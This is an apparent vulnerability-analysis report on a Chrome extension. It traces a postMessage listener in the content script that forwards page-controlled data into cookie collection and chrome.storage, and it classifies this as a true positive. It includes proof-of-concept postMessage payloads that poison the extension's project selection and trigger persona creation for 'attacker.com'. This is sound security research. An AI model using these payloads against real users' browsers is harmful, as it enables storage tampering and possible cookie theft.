# CoCo Analysis: mhfghpphkconmdnchafaobifnignolom

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (reported twice by CoCo)

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mhfghpphkconmdnchafaobifnignolom/opgen_generated_files/cs_0.js
Line 480	!function(){"use strict";var e=new Uint32Array(2);window.crypto.getRandomValues(e);...
```

**Note:** CoCo only detected flows in minified extension code starting at Line 480. The actual extension code starts at Line 465 (after the 3rd "// original" marker).

**Code:**

```javascript
// Content script (cs_0.js / content-script.js) - Entry point
// Minified code at line 480, deobfuscated:
window.addEventListener("message", function(e) {  // ← attacker can send postMessage
  var t = e.data;
  if (e.source === window && t.target === l && (null != _ || "ext::init" === t.type)) {
    var s = t.payload;

    // Multiple message handlers including:
    if ("savePersona" == t.type) {
      // Function that collects cookies and sends to background
      var n = s.name, i = s.domains, o = s.projectId, l = {}, c = i.length, r = 0;
      i.forEach(function(domain) {
        chrome.runtime.sendMessage({type:"getCookies", domain:domain}, function(cookies) {
          // ... collect cookies ...
          chrome.runtime.sendMessage({
            type:"createPersona",
            persona:{name:n, sites:l, rulesets:s, totalCookies:r},
            projectId:o
          }, function(response) {
            // ... // ← attacker-controlled data flows to background
          });
        });
      });
    }
    else if ("updatePersona" == t.type) {
      // Similar flow for updating persona with cookies
      chrome.runtime.sendMessage({
        type:"updatePersona",
        id:i,
        sites:o,
        totalCookies:c,
        projectId:s
      }, function(response) {
        // ... // ← attacker-controlled data
      });
    }
    else if ("setProject" == t.type) {
      chrome.runtime.sendMessage({
        type:"setSelectedProjectId",
        currentProjectId:s.projectId  // ← attacker-controlled
      }, function(response) {
        window.postMessage({target:a, id:t.id}, "*");
      });
    }
  }
}, false);

// Background script receives these messages and stores to chrome.storage.local
// The background would handle messages like "createPersona", "updatePersona", "setSelectedProjectId"
// and store the data using chrome.storage.local.set()
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// Malicious webpage code - any page can send postMessage
// The extension runs on all HTTP/HTTPS pages per manifest

// Attack 1: Poison project selection
window.postMessage({
  target: "ext@" + /* need to guess or brute-force the random token */,
  type: "setProject",
  payload: {
    projectId: "attacker_controlled_project_id"
  }
}, "*");

// Attack 2: Trigger persona creation with malicious data
window.postMessage({
  target: "ext@" + /* random token */,
  type: "savePersona",
  payload: {
    name: "malicious_persona",
    domains: ["attacker.com"],
    rulesets: /* attacker data */,
    projectId: "attacker_project"
  }
}, "*");

// Note: The extension uses a random token (btoa(e[0]+"-"+e[1])) as target verification,
// which makes exploitation harder but not impossible through brute-force or timing attacks.
// However, even if the attacker can't guess the exact token, they can try to poison
// the storage when the legitimate Sintelix page is loaded.
```

**Impact:** Storage poisoning vulnerability through window.postMessage. A malicious webpage can send postMessage events to manipulate the extension's stored data including project IDs, persona configurations, and potentially trigger unwanted background operations. While the extension attempts to validate the message target using a random token, this is security through obscurity and can be bypassed. The extension also collects and transmits cookies to its backend based on attacker-controlled domain lists in the "savePersona" flow, which could be exploited to exfiltrate cookies from arbitrary domains if the extension has broad cookie permissions.

The extension runs on all URLs ("matches": ["http://*/*", "https://*/*"]), making this exploitable from any malicious website the user visits.
